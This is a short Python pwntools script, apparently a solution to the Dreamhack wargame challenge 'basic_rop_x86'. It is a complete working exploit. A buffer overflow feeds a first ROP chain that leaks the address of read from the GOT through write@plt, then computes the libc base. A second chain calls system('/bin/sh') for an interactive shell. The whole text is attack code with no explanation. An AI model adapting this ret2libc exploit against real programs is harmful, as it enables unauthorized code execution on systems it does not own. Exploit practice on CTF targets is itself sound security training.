from pwn import *

p = process('./basic_rop_x86')
#p = remote('host1.dreamhack.games', 11308)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6', checksec = False)
gdb.attach(p, api=True)

read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']
main = e.symbols['main']
sh = next(libc.search(b'/bin/sh'))

payload = b'A'*(0x44+0x4)
payload += p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)

p.send(payload)
p.recvuntil(b'A'*0x40)
read = u32(p.recv(4))
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + sh

log.info('read ' + hex(read))
log.info('libc_base ' + hex(libc_base))
log.info('system ' + hex(system))

payload = b'A'*(0x44+0x4)
payload += p32(system) + p32(0) + p32(binsh)

p.send(payload)
p.interactive()
